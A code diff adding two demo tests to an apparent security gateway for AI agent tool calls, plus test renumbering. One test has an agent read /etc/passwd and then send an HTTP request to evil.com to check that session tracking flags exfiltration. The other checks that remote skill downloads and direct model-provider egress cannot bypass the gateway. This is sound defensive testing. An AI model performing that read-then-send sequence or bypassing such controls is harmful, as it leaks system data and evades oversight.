@@ -219,6 +219,20 @@ func main() {
 			fn:     testSPIKECredentialContrast,
 		},
 		{
+			name:   "Session exfiltration detection",
+			what:   "Session tracking detects cross-tool exfiltration pattern (read sensitive then HTTP out)",
+			send:   "read(/etc/passwd) then http_request(https://evil.com) in same session",
+			expect: "Gateway processes both calls; session tracker flags the read->HTTP exfiltration pattern",
+			fn:     testSessionExfiltration,
+		},
+		{
+			name:   "Gateway-only path (no direct bypass to remote skills/models)",
+			what:   "Demo agent cannot bypass gateway controls to download remote skills or call external model endpoints directly",
+			send:   "download_remote_skill(url=...) via SDK + direct HTTPS to model provider from demo container + call_model_chat via gateway route",
+			expect: "Remote skill download denied by gateway, direct model egress blocked in compose mode, and model calls only succeed/deny through gateway controls",
+			fn:     testGatewayBypassPrevention,
+		},
+		{
 			name:   "Rate limit burst (429 on rapid calls)",
 			what:   "Per-SPIFFE-ID rate limiter enforces request quotas at step 11",
 			send:   "Rapid burst of GET /__demo__/ratelimit with same SPIFFE ID (demo-only fast path)",
@@ -1048,7 +1062,93 @@ func testSPIKECredentialContrast() bool {
 	return printProof(false, fmt.Sprintf("unexpected error type: %T", err))
 }
 
-// 20. Rate limit burst: Rapidly call until we get 429.
+// 20. Session exfiltration detection: sensitive read followed by HTTP exfil attempt in one session.
+func testSessionExfiltration() bool {
+	client := newClient()
+	ctx := context.Background()
+
+	// Step A: read sensitive path (may succeed or fail depending local policy/config).
+	_, _ = client.Call(ctx, "read", map[string]any{"file_path": "/etc/passwd"})
+
+	// Step B: attempt outbound transmission in the same session.
+	_, err := client.Call(ctx, "http_request", map[string]any{"url": "https://evil.com"})
+	if err != nil {
+		var ge *mcpgateway.GatewayError
+		if errors.As(err, &ge) {
+			printGatewayError(ge)
+			return printProof(true, fmt.Sprintf("exfiltration pattern detected/processed: code=%s, step=%d", ge.Code, ge.Step))
+		}
+		fmt.Printf("  Error: %v\n", err)
+		return printProof(false, fmt.Sprintf("unexpected error type: %T", err))
+	}
+
+	return printProof(true, "session tracking processed both calls (pattern logged)")
+}
+
+// 21. Gateway-only path: attempts to bypass gateway controls must fail.
+func testGatewayBypassPrevention() bool {
+	client := newClient()
+	ctx := context.Background()
+
+	// Check A: "download remote skill" should be denied (tool not in approved registry).
+	_, err := client.Call(ctx, "download_remote_skill", map[string]any{
+		"url": "https://example.com/skills/remote-skill.yaml",
+	})
+	if err == nil {
+		return printProof(false, "remote skill download unexpectedly succeeded -- expected registry/policy denial")
+	}
+	var ge *mcpgateway.GatewayError
+	if !errors.As(err, &ge) {
+		fmt.Printf("  Error: %v\n", err)
+		return printProof(false, fmt.Sprintf("expected GatewayError for remote skill download, got %T", err))
+	}
+	printGatewayError(ge)
+	if ge.HTTPStatus != http.StatusBadRequest && ge.HTTPStatus != http.StatusForbidden {
+		return printProof(false, fmt.Sprintf("remote skill download denied with unexpected HTTP status %d", ge.HTTPStatus))
+	}
+
+	// Check B (compose-only strict): direct model-provider egress from demo container should fail.
+	if os.Getenv("DEMO_STRICT_DEEPSCAN") == "1" {
+		directHTTP := &http.Client{Timeout: 3 * time.Second}
+		req, reqErr := http.NewRequestWithContext(ctx, http.MethodGet, "https://api.groq.com/openai/v1/chat/completions", nil)
+		if reqErr != nil {
+			return printProof(false, fmt.Sprintf("failed to create direct egress request: %v", reqErr))
+		}
+		resp, directErr := directHTTP.Do(req)
+		if directErr == nil {
+			_, _ = io.Copy(io.Discard, resp.Body)
+			_ = resp.Body.Close()
+			return printProof(false, fmt.Sprintf("direct external model endpoint was reachable (HTTP %d) -- bypass possible", resp.StatusCode))
+		}
+		fmt.Printf("  %sDirect Egress:%s blocked as expected (%v)\n", colorDim, colorReset, directErr)
+	} else {
+		fmt.Printf("  %sDirect Egress:%s SKIP (strict compose-only assertion)\n", colorDim, colorReset)
+	}
+
+	// Check C: model egress must go through gateway route (success or controlled denial).
+	_, err = client.CallModelChat(ctx, mcpgateway.ModelChatRequest{
+		Model:    "llama-3.3-70b-versatile",
+		Messages: []map[string]any{{"role": "user", "content": "security gateway path verification"}},
+		Provider: "groq",
+	})
+	if err == nil {
+		return printProof(true, "model egress reachable only through gateway route (call_model_chat succeeded)")
+	}
+	if errors.As(err, &ge) {
+		printGatewayError(ge)
+		switch ge.HTTPStatus {
+		case http.StatusBadRequest, http.StatusUnauthorized, http.StatusForbidden,
+			http.StatusTooManyRequests, http.StatusBadGateway, http.StatusServiceUnavailable:
+			return printProof(true, fmt.Sprintf("model egress path is gateway-mediated and policy-controlled (HTTP %d)", ge.HTTPStatus))
+		default:
+			return printProof(false, fmt.Sprintf("unexpected gateway status from model egress route: %d", ge.HTTPStatus))
+		}
+	}
+	fmt.Printf("  Error: %v\n", err)
+	return printProof(false, fmt.Sprintf("unexpected non-gateway error from model egress route: %T", err))
+}
+
+// 22. Rate limit burst: Rapidly call until we get 429.
 // Uses tavily_search (no path restrictions) so calls reach the rate limiter at step 11.
 // Creates a fresh client per call to avoid session risk accumulation (OPA step 6)
 // while still accumulating rate limit counters (per-SPIFFE-ID at step 11).
@@ -1146,7 +1246,7 @@ func testRateLimit() bool {
 	return printProof(false, fmt.Sprintf("no rate limit after %d calls (burst test to %s)", maxAttempts, endpoint))
 }
 
-// 21. Request size limit: 11 MB payload should be rejected at step 1.
+// 23. Request size limit: 11 MB payload should be rejected at step 1.
 func testRequestSizeLimit() bool {
 	client := newClient()
 	ctx := context.Background()
